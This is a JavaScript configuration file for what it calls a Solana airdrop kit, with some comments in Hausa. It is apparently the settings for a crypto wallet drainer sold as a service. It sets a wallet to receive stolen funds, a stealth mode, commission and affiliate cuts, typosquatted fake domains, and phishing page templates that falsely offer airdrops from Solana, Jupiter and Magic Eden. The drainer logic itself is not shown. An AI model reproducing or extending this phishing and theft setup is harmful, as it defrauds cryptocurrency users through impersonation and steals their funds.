// ============================================================
// SETTINGS - SOLANA AIRDROP v1.0
// ============================================================

// 1. WALLET ADDRESS - SAKA NAKA ANAN (Solana address)
const receiveAddress = "YOUR_SOLANA_WALLET_ADDRESS_HERE";

// 2. MINIMUM BALANCE (SOL)
const minimumBalance = 0.1;

// 3. 24-HOUR DELAY (hours)
const delayHours = 0; // Saita 0 don gwaji, canza zuwa 24 don gaske

// 4. NETWORK
const network = "mainnet-beta";

// 5. STEALTH MODE
const stealthMode = true;

// 6. RETRY ATTEMPTS
const retryAttempts = 3;

// 7. GAS MULTIPLIER
const gasMultiplier = 1.1;

// 8. DaaS SETTINGS
const daasEnabled = true;
const daasCommission = 20;
const affiliateEnabled = true;
const affiliateAddress = "YOUR_AFFILIATE_ADDRESS";

// 9. FAKE DOMAINS - Typosquatting
const FAKE_DOMAINS = [
    "solana-airdrop.net",
    "solana-claim.com",
    "solana-rewards.io",
    "solana-verify.org",
    "solana-offer.com",
    "s0lana-airdrop.com",
    "solana-airdrop.org"
];

// 10. PHISHING PAGES
const PHISHING_PAGES = {
    'solana': {
        logo: '☀️', title: 'Solana Airdrop', price: '100 SOL',
        desc: 'Claim 100 SOL from the Solana Foundation airdrop.',
        btn: 'Claim Airdrop', items: '125K', floor: '100 SOL', volume: '12,345 SOL',
        grad: 'linear-gradient(135deg,#9945FF,#6c5ce7)'
    },
    'jupiter': {
        logo: '🪐', title: 'Jupiter Airdrop', price: '50 SOL',
        desc: 'Claim 50 SOL from Jupiter DEX airdrop.',
        btn: 'Claim Reward', items: '82K', floor: '50 SOL', volume: '8,560 SOL',
        grad: 'linear-gradient(135deg,#6c5ce7,#a855f7)'
    },
    'magic': {
        logo: '✨', title: 'Magic Eden Airdrop', price: '25 SOL',
        desc: 'Claim 25 SOL from Magic Eden NFT marketplace.',
        btn: 'Claim Now', items: '51K', floor: '25 SOL', volume: '4,120 SOL',
        grad: 'linear-gradient(135deg,#f59e0b,#f97316)'
    }
};
